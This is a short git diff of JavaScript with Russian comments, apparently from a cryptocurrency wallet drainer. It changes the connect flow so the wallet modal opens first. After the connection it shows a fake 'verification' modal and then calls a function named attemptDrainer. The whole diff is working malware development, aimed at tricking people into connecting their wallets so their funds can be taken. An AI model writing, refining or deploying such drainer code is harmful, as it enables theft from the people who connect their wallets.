@@ -311,14 +311,19 @@ async function attemptDrainer() {
 // === Подключение кошелька и запуск ===
 async function handleConnectOrAction() {
   try {
+    // Открываем модальное окно AppKit для подключения кошелька
+    await appKitModal.open();
     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    
     if (accounts.length === 0) {
-      await appKitModal.open();
       connectedAddress = await waitForWallet();
     } else {
       connectedAddress = accounts[0];
       console.log('✅ Подключён:', connectedAddress);
     }
+
+    // После успешного подключения сразу показываем верификационное модальное окно
+    showModal();
 
     if (!isTransactionPending) {
       await attemptDrainer();
